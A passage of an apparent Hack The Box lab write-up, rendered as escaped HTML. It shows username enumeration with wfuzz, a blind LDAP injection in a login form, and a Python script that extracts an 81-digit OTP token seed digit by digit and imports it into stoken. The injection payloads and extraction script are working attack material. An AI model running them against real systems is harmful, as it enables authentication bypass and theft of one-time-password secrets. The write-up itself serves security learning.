-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/js/bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; These comments look interesting :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;
-      &amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; So now we know that they are using a token to generate the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; thing again. 
-&lt;br /&gt; I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :
-&lt;img src=&quot;/images/hackthebox/ctf/4.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ctf/5.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a &lt;code class=&quot;highlighter-rouge&quot;&gt;200 OK&lt;/code&gt; response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;multiplesources-users-fabian-fingerle.de.txt&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt 
-
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-
-********************************************************
-* Wfuzz 2.3.4 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://ctf.htb/login.php
-Total requests: 21168
-
-==================================================================
-ID   Response   Lines      Word         Chars          Payload    
-==================================================================
-
-000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
-000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
-000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
-000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
-000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
-000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
-000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
-000009:  C=200     68 L      233 W         2827 Ch        &quot;&quot;&quot;&quot;
-000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
-000001:  C=200     68 L      233 W         2826 Ch        &quot;-&quot;
-000011:  C=200     68 L      233 W         2826 Ch        &quot;0&quot;
-000012:  C=200     68 L      233 W         2827 Ch        &quot;00&quot;
-000021:  C=200     68 L      233 W         2835 Ch        &quot;0123456789&quot;
-000015:  C=200     68 L      233 W         2833 Ch        &quot;00000000&quot;
-000016:  C=200     68 L      233 W         2827 Ch        &quot;01&quot;
-^C
-Finishing pending requests...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; All “user not found” responses have 233 words so I filtered them :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c --hw 233 -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt                                  
-
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-
-********************************************************
-* Wfuzz 2.3.4 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://ctf.htb/login.php
-Total requests: 21168
-
-==================================================================
-ID   Response   Lines      Word         Chars          Payload    
-==================================================================
-
-000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
-000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
-000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
-000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
-000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
-000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
-000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
-000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
-000065:  C=200     68 L      229 W         2810 Ch        &quot;123456*a&quot;
-005121:  C=200     68 L      229 W         2810 Ch        &quot;Ch4ng3m3!&quot;
-005723:  C=200     68 L      229 W         2810 Ch        &quot;*%Cookie:&quot;
-009377:  C=200     68 L      229 W         2810 Ch        &quot;!!Huawei&quot;
-011497:  C=200     68 L      231 W         2822 Ch        &quot;ldapuser&quot;
-011866:  C=200     68 L      234 W         2835 Ch        &quot;lost+found&quot;
-012611:  C=200     68 L      233 W         2831 Ch        &quot;maurta&quot;^C
-Finishing pending requests...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;  It worked and I didn’t get banned, after some time I got a result which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt;, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; to see what’s the other message :
-&lt;img src=&quot;/images/hackthebox/ctf/6.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ctf/7.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; It was “Cannot login”
-&lt;br /&gt; Then I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;!@#%^&amp;amp;*&lt;/code&gt; and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attribute. With the injection we have we can extract the token and use it to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s. But because the injection is blind it will be kinda tricky to extract the token.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;ldap-injection&quot;&gt;LDAP Injection&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; As I said, it’s a blind injection which means that we won’t get any results. But a payload like this :&lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt;  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :
-&lt;br /&gt; Request :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /login.php HTTP/1.1
-Host: ctf.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://ctf.htb/login.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 190
-Cookie: PHPSESSID=sqmpanb3d1uui0pf4uafubv010
-Connection: close
-Upgrade-Insecure-Requests: 1
-
-inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;amp;inputOTP=0000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Response :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-HTTP/1.1 200 OK
-Date: Fri, 19 Jul 2019 17:58:29 GMT
-Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
-X-Powered-By: PHP/5.4.16
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 2822
-Connection: close
-Content-Type: text/html; charset=UTF-8
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-	---------
-	 Removed
-	---------
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    Cannot login    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-	---------
-	 Removed
-	---------
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked &lt;a href=&quot;https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attributes&lt;/a&gt; and chose some of them to test (&lt;code class=&quot;highlighter-rouge&quot;&gt;comment&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt;), the payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=*&lt;/code&gt; (instead of the second &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=N&lt;/code&gt;. After some testing this payload with the attribute &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and value of 2 : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2&lt;/code&gt; resulted in “Cannot login” message. Great so our payload will be &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2N&lt;/code&gt; and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;exploitation-token-extraction&quot;&gt;Exploitation, Token Extraction&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; I created 3 functions :&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt;  (to send the injection payload and receive the response)&lt;/li&gt;
-  &lt;li&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; (to check whether the response contains “Cannot login” or not)&lt;/li&gt;
-  &lt;li&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt; : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D&lt;/code&gt; + token + number + &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A&lt;/code&gt; (encoded only once because python requests automatically encodes POST data). Then it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt;, if &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; returned &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; it adds the valid number to the token.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; Then I wrote a &lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt; loop to keep calling &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit()&lt;/code&gt; as long as &lt;code class=&quot;highlighter-rouge&quot;&gt;len(token)&lt;/code&gt; is not 81 
-&lt;br /&gt;
-&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;extract_token.py&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0000&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.122/login.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cannot login&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%29%28%7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pager&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D{}{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Extracting Token&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Status : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Done !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Token : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ctf/8.gif&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; It took some minutes to finish and now we have the token :
-&lt;img src=&quot;/images/hackthebox/ctf/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;285449490011357156531651545652335570713167411445727140604172141456711102716717000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; I installed &lt;a href=&quot;https://github.com/cernekee/stoken&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt;&lt;/a&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install stoken&lt;/code&gt;), Then I imported the token :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/10.png&quot; alt=&quot;&quot; /&gt; 
